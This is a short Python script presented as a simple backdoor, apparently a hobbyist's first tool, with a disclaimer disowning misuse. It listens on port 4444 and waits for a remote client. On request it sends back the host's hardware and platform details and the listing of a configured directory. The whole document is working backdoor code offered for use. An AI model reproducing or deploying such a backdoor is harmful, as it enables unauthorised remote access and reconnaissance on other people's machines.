#!/bin/python3

import socket
import platform
import os

#STUFF TO CONFIGURE
givenOpt = "." #This is the Target path for the get directory option. It is current path by default.
port = 4444 #Port you want the backdoor to run on

# My first script so pardon the noobiness :) Please send suggestions on how I could improve via twitter @elbee_ez or to my team @AstraCyber
# I must admit I am a pretty shitty programmer


print("\n")
print("elbee's Simple Backdoor Loaded!")
print("===============================")
print("Connect to this backdoor with the client.")
print("===============================")
print("===============================")
print("NOT FOR ILLEGAL OR GOVERNMENT USE")
print("I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS TOOL")
print("\n")

hostname = socket.gethostname()
address = socket.gethostbyname(hostname)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((address, port))
s.listen(1)
print("Started. \n")
connection, address = s.accept()
print("CONNECTED. ATTACK INITIALIZED. \n")
space = " "
while 1:
	data = connection.recv(1024)
	if not data: break
	connection.sendall('Recieved. \n'.encode())
	option = int(data.decode('utf-8'))
	if option == 1:
		archetype = [platform.machine(), platform.node(), platform.platform(1,1), platform.processor()]
		integer = 0
		while integer < len(archetype):
			nextSend = archetype[integer]
			integer = integer + 1
			connection.sendall(nextSend.encode()+ space.encode())
	elif option == 2:
		integerTwo = 0
		returnVal = os.listdir(givenOpt)
		while integerTwo < len(returnVal):
			nextSendTwo = returnVal[integerTwo]
			integerTwo = integerTwo + 1
			connection.sendall(nextSendTwo.encode()+ space.encode())
	else:
		connection.sendall('Enter a valid option.'.encode())
		
	
connection.close()
